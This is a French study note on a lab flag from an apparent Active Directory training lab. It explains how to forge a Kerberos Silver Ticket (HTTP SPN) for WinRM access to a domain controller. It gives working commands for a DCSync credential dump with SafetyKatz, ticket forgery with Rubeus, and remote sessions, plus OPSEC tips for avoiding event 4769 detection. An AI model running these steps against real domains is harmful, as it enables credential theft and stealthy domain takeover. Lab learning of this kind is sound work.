---
flag: 18
machine: dcorp-dc
statut: à faire
technique: Silver Ticket
LO: [[LO09 - Exec sur le DC (HOST et WMI)]]
---

# F18 · Service pour Silver Ticket (winrs/PSRemoting)

> [!summary] Objectif
> Identifier le nom du service Kerberos (SPN class) dont le Silver Ticket permet un accès `winrs` / `Enter-PSSession` sur le DC.

## Contexte
- **Etape attack flow** : persistence Kerberos post-DA — on a déjà le hash machine du DC (`dcorp-dc$`) via DCSync ou dump SAM.
- **Ce qu on a** : hash RC4/AES du compte machine `dcorp-dc$`, SID du domaine `dollarcorp.moneycorp.local`.
- **Ce qu on cherche** : le nom du service à passer à `Rubeus silver /service:<SVC>/<DC_FQDN>` pour que le TGS forgé soit accepté par WinRM (port 5985 / PSRemoting / winrs).

## Solution

### Etape 1 — Récupérer le hash machine du DC
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
```
→ Voir [[Cheatsheet - Persistence]] (DCSync).

### Etape 2 — Forger le Silver Ticket pour PSRemoting/winrs
Le Kerberos SPN class pour WinRM (HTTP.sys → PSRemoting/winrs) est **HTTP**.
```powershell
Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<A REMPLIR DEPUIS LAB> /sid:<A REMPLIR DEPUIS LAB> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
→ Voir [[Cheatsheet - Tickets Kerberos]] — section Silver.

### Etape 3 — Réutiliser le ticket
```powershell
klist
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
# ou
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Reponse

| Element | Valeur |
|---------|--------|
| Service Kerberos (SPN class) pour winrs/PSRemoting | **HTTP** |
| Hash RC4 machine `dcorp-dc$` utilisé | <A REMPLIR DEPUIS LAB> |
| SID domaine `dollarcorp.moneycorp.local` | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- **FQDN obligatoire** dans le SPN — `winrs -r:dcorp-dc` (nom court) échoue, il faut le FQDN qui matche la partie hôte du ticket.
- Ne pas confondre avec WMI qui exige **deux** tickets : `host/` + `rpcss/` (LO09).
- Utiliser `/aes256` plutôt que `/rc4` quand possible — un TGS RC4 sur un compte AES-only déclenche event **4769** avec Ticket Encryption Type anormal.
- Aucun trafic vers le KDC → plus furtif que Golden, mais le ticket porte le FQDN exact du service.

## Refs
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Persistence]]
- [[Synthèse - Kerberos]]
- [[LO09 - Exec sur le DC (HOST et WMI)]]

[[Flags - Index]] · [[Journal - Index]]
